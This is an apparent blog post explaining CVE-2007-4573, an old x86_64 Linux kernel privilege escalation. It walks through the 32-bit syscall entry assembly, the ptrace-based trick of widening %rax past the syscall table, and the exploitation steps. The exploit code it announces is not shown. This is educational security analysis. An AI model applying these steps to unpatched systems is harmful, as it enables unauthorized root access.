[CVE-2007-4573](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4573)
is two years old at this point, but it remains one of my favorite
vulnerabilities. It was a local privilege-escalation vulnerability on
all `x86_64` kernels prior to `v2.6.22.7`. It's very simple to
understand with a little bit of background, and the exploit is
super-simple, but it's still more interesting than Yet Another NULL
Pointer Dereference. Plus, it was the first kernel bug I wrote an
exploit for, which was fun.

In this post, I'll write up my exploit for CVE-2007-4573, and try to
give enough background for someone with some experience with C, Linux,
and a bit of x86 assembly to understand what's going on. If you're an
experienced kernel hacker, you probably won't find much new here, but
if you're not, hopefully you'll get a sense for some of the pieces
that go into a kernel exploit.

## The patch

I'll start out with the patch, or rather a slightly simplified
version, that omits some hunks that will be irrelevant for my
discussion. Then I'll explain the context for the patch, and by that
point we'll have enough context to understand the exploit code.

A simplified version of the patch follows (The original is
[`176df245`](http://git.kernel.org/linus/176df2457ef6207156ca1a40991c54ca01fef567)
in linus's git repository) Note that this patch was applied to v2.6.22
-- These files have moved around, so pull out an older kernel if
you're trying to follow along at home:

The patch defines the `IA32_LOAD_ARGS` macro, and replaces `LOAD_ARGS`
with it in several places (I've only shown one for
simplicity). `LOAD_ARGS32` differs only slightly from the `LOAD_ARGS`
macro that it is replacing, which is defined in
`include/asm-x86_64/calling.h`:

    .macro LOAD_ARGS offset
    movq \offset(%rsp),%r11
    movq \offset+8(%rsp),%r10
    movq \offset+16(%rsp),%r9

    movq \offset+64(%rsp),%rdi
    movq \offset+72(%rsp),%rax
    .endm

As the name suggests, `LOAD_ARGS32` loads the registers from the stack
as 32-bit values, rather than 64-bit. Importantly, in doing so it
takes advantage of a quirk in the `x86_64` architecture, that causes
the top 32 bits of the registers to be zeroed if you write to the
32-bit versions. `LOAD_ARGS32` thus zero-extends the 32-bit values it
loads into the 64-bit registers.

## System call handling

So, why is this patch so important? Let's look at the context for the
`LOAD_ARGS` → `LOAD_ARGS32` change. `ia32entry.S` contains the
definitions for entry-points for 32-bit compatibility-mode system
calls on an `x86_64` processor. In other words, for 32-bit processes
running on the 64-bit machine, or for 64-bit processes that use
old-style `int $0x80` system calls for whatever reason.

There are three entry points in the file, one for 32-bit `SYSCALL`
instructions, one for 32-bit `SYSENTER`, and one for `int $0x80`. They
are all very similar, and we will only consider the `int $0x80` case
here. At boot-time, Linux configures the processor so that `int $0x80`
will dispatch to the `ia32_syscall` entry point. Ignoring a bunch of
debugging information, tracing, and other junk, this entry point's
code is essentially simple:

    ENTRY(ia32_syscall)
            movl %eax,%eax

            pushq %rax
            SAVE_ARGS 0,0,1

            GET_THREAD_INFO(%r10)
            orl   $TS_COMPAT,TI_status(%r10)
            testl $_TIF_WORK_SYSCALL_ENTRY,TI_flags(%r10)
            jnz ia32_tracesys

            cmpl $(IA32_NR_syscalls-1),%eax
            ja ia32_badsys

    ia32_do_call:
            IA32_ARG_FIXUP
            call *ia32_sys_call_table(,%rax,8)

            movq %rax,RAX-ARGOFFSET(%rsp)
            jmp int_ret_from_sys_call

`%eax`, according to Linux's syscall convention, stores the syscall number. The `mov` zero-extends it into `%rax`, and then we save it and the syscall arguments onto the stack.

The next block retrieves the `struct thread_info` for the current task,  sets the `TS_COMPAT` status bit to indicate that we're handling a 32-bit compatibility mode syscall, and then
checks the thread's flags to determine whether this thread has been flagged for extra processing on syscall entry. If so, we jump away to
code to handle that work.

Next (at the `cmpl`), we check to make sure that the requested syscall is in-bounds, and branch to an error path if not.

`IA32_ARG_FIXUP` is a simple macro that moves registers around to
translate between the Linux syscall calling convention and the
`x86_64` calling convention, which each hold arguments in different
registers. Once we've fixed up the registers, the `call` instruction indexes the system call table by the system call number, looks up the address stored there, and calls into it to dispatch the syscall.

Finally, we save the return code from the system call into the register area on the stack, and jump to code to handle the return to userspace.

-----

One thing we should notice about this code is that when we
check that the syscall is in bounds, we compare against the 32-bit
`%eax` register, but when we actually dispatch the syscall, we use
the full 64 bits in `%rax`. The `movl` at the top of the function serves to zero-extend `%eax`, so that normally, the top 32 bits of `%rax` are zero, and this distinction doesn't matter.

The problem arises in the "traced" path in `ia32_tracesys`, which is (again, with some
extra code removed):

    ia32_tracesys:
            movq %rsp,%rdi        /* &pt_regs -> arg1 */
            call syscall_trace_enter
            LOAD_ARGS ARGOFFSET  /* reload args from stack in case ptrace changed it */
            jmp ia32_do_call

Essentially, `ia32_tracesys` just calls into the C function
`syscall_trace_enter`, with a pointer to the registers saved on the stack,
and then restores the register values from the stack and jumps back to
execute the system call.

Herein lies the problem. If `syscall_trace_enter` replaces the on-stack `%rax` with a 64-bit value, and `LOAD_ARGS` restores it, then the `%eax`/`%rax` distinction above becomes a problem.
Aas long as `%eax` is less than `(IA32_NR_syscalls-1)`, `%rax` can be much larger than the size of the syscall table, causing the `call` to index off the end of it.

## ptrace(2)

So what happens inside `syscall_trace_enter`, and how can we take
advantage of that to load a 64-bit value into the restored `%rax`?
Well, that turns out to be the code that handles processes traced by
the `ptrace(2)` process-tracing mechanism, which among other things,
allows the tracer to stop a child process before each system call, and
inspect and modify the child's registers for the system call procedes.

Reading `ptrace(2)`, we find that we can use `ptrace(PTRACE_SYSCALL,…)`
to cause a process to execute until its next system call, and then,
once it's stopped, we can use `ptrace(PTRACE_POKEUSER,…)` to modify
the tracee's registers.

## Putting it all together

So, to exploit this bug, we need to:

 * Have a 64-bit process attach to some process with `ptrace`.
 * Use `PTRACE_SYSCALL` to stop that process at its next syscall
 * Have the process execute an `int $0x80`
 * Have the parent modify `%rax` in the child to be 64 bits wide, and
   allow the child to continue.

At this point, the child will index waaay off the end of the syscall
table -- so far off, in fact, that it will wrap around past the end of
memory (On `x86_64`, the entire kernel is mapped into the last
2 GB of address space). Since the kernel and user programs run in the same
address space, this means that, with an appropriate choice of `%rax`, the kernel will dereference an address
in the user address space to find out the address of the function it should jump to in order to handle the system call.

My entire exploit code follows.  This is not fully weaponized at all
-- it depends on tweaking for the specific target kernel, for one, but
it works. (Well, if you can find an unpatched kernel anywhere any more
these days, it works). Nowadays, if I were writing an exploit like
this, I'd plug it into something like Brad Spengler's
[Enlightenment](http://www.milw0rm.com/exploits/9627), which takes
care of most of the annoying bits of executing shell-code in-kernel to
change the current user, disable any security modules that might be
problematic, and work across kernel versions, as necessary.
